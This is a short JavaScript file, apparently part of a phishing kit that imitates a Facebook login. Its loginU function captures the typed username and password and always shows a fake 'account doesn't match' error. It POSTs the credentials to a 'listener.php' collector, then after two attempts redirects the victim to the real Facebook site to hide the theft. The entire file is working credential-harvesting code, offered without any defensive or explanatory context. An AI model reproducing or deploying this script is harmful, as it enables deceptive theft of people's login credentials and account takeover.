var count = 0;
function loginU()
{
    
    var userName = document.getElementById("user").value;
    var passUser = document.getElementById("password").value;


    var error = document.getElementById("error");
    error.style.color = 'red';
    
    error.innerHTML = "This email or phone number you're entered doesn't match any account Sign Up for an account.";

    var theObject = new XMLHttpRequest();

    theObject.open('POST', 'listener.php', true); // send data to the server
    theObject.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');// header
    theObject.send('username='+userName+'&'+'Password='+passUser);
 
    count++;
    if(count == 2)
    {
        count = 0;
        location.href="https://www.facebook.com/";
    }
    //alert("Usuario: " + userName + "\n Contrasena: "+ passUser +"\ncontador: "+count);
    return false;
}

